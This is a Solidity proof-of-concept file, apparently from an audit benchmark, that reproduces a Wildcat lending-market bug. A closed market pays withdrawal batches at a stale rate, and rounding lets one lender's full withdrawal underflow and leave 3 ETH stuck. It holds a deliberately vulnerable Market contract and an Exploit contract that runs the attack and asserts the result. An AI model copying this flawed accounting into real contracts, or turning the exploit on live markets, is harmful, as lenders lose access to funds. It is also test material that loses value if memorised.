// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* Wildcat — a closed market pays a batch before every lender has queued (Code4rena H-01, AuditVault 41701).
   SYNTHETIC, cheatcode-free. executeWithdrawal uses
   mulDiv(normalizedAmountPaid, scaledAmount, scaledTotalAmount) on the live batch.
   Alice withdraws at the pre-join rate. Bob's 1-wei queues round a scaled unit up while
   reserving only 1 wei, and Laurence's full withdrawal then underflows normalizedUnclaimedWithdrawals.
   His 3 ETH stays in the market. */

contract Cash {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

library MathUtils {
    function mulDiv(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        return a * b / c;
    }
}

contract Market {
    uint256 public constant RAY = 100;
    uint256 public scaleFactor = 300;
    Cash public asset;
    bool public closed;
    uint256 public normalizedAmountPaid;
    uint256 public scaledTotalAmount;
    uint256 public normalizedUnclaimedWithdrawals;
    mapping(address => uint256) public scaledBalance;
    mapping(address => uint256) public scaledQueued;
    mapping(address => uint256) public normalizedWithdrawn;

    constructor(Cash _asset) {
        asset = _asset;
    }

    function scaleAmount(uint256 amount) public view returns (uint256) {
        return (amount * RAY + scaleFactor - 1) / scaleFactor;
    }

    function normalize(uint256 scaled) public view returns (uint256) {
        return scaled * scaleFactor / RAY;
    }

    function deposit(address lender, uint256 scaled) external {
        scaledBalance[lender] += scaled;
    }

    function closeMarket() external {
        closed = true;
    }

    function queueWithdrawal(address lender, uint256 amount) external {
        uint256 scaled = scaleAmount(amount);
        require(scaled > 0, "zero");
        require(scaledBalance[lender] >= scaled, "balance");
        scaledBalance[lender] -= scaled;
        _queue(lender, scaled, amount);
    }

    function queueFullWithdrawal(address lender) external {
        uint256 scaled = scaledBalance[lender];
        require(scaled > 0, "zero");
        scaledBalance[lender] = 0;
        _queue(lender, scaled, normalize(scaled));
    }

    function _queue(address lender, uint256 scaled, uint256 normalized) internal {
        scaledQueued[lender] += scaled;
        normalizedAmountPaid += normalized;
        scaledTotalAmount += scaled;
        normalizedUnclaimedWithdrawals += normalized;
    }

    function executeWithdrawal(address lender) external returns (uint256) {
        require(closed, "open");
        uint128 newTotalWithdrawn = uint128(
            MathUtils.mulDiv(normalizedAmountPaid, scaledQueued[lender], scaledTotalAmount)
        ); // @> VULN: the batch is still open, so this share uses a total later rounding will shrink
        uint256 owed = uint256(newTotalWithdrawn) - normalizedWithdrawn[lender];
        require(owed > 0, "zero owed");
        normalizedWithdrawn[lender] = newTotalWithdrawn;
        normalizedUnclaimedWithdrawals -= owed;
        asset.transfer(lender, owed);
        return owed;
    }
}

contract Exploit {
    Cash public token; // nonce 1
    Market public market; // nonce 2
    address public constant ALICE = address(uint160(0xA11CE));
    address public constant BOB = address(uint160(0xB0B));
    address public constant LAURENCE = address(uint160(0x1A0));
    bool public laurenceReverted;
    uint256 public aliceGot;
    uint256 public bobGot;
    uint256 public stuck;

    constructor() {
        token = new Cash();
        market = new Market(token);
    }

    function run() external {
        market.deposit(ALICE, 100 ether);
        market.deposit(BOB, 3);
        market.deposit(LAURENCE, 1 ether);
        token.mint(address(market), 300 ether + 3 ether + 5);

        market.queueFullWithdrawal(ALICE);
        market.closeMarket();
        aliceGot = market.executeWithdrawal(ALICE);

        market.queueWithdrawal(BOB, 1);
        market.queueWithdrawal(BOB, 1);
        market.queueFullWithdrawal(BOB);
        market.queueFullWithdrawal(LAURENCE);

        bobGot = market.executeWithdrawal(BOB);
        try market.executeWithdrawal(LAURENCE) {
            laurenceReverted = false;
        } catch {
            laurenceReverted = true;
        }

        stuck = token.balanceOf(address(market));
        require(aliceGot == 300 ether, "alice");
        require(bobGot == 8, "bob");
        require(laurenceReverted, "laurence paid");
        require(token.balanceOf(LAURENCE) == 0, "laurence received");
        require(market.scaledBalance(LAURENCE) == 0, "position not burned");
        require(stuck == 3 ether - 3, "stuck");
    }
}
